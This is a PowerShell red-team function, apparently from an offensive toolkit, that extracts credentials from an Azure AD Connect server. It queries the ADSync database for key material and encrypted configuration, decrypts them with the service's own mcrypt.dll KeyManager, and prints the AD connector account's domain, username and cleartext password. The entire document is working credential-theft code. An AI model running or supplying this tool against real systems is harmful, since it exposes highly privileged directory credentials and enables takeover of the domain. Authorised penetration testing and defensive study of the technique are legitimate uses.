Function Azure-ADConnect {param($db,$server)
$help = @"
.SYNOPSIS
    Azure-ADConnect
    PowerShell Function: Azure-ADConnect
    Author: Luis Vacas (CyberVaca)
    Based on: https://blog.xpnsec.com/azuread-connect-for-redteam/

    Required dependencies: None
    Optional dependencies: None
.DESCRIPTION

.EXAMPLE
    Azure-ADConnect -server 10.10.10.10 -db ADSync

    Description
    -----------
    Extract credentials from the Azure AD Connect service.

"@
if ($db -eq $null -or $server -eq $null) {$help} else {
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server = $server; Database = $db; Initial Catalog=$db; 
Integrated Security = True;"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path "C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll"
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}

"[+] Domain:  " + $domain.Domain
"[+] Username: " + $username.Username
"[+]Password: " + $password.Password
}}
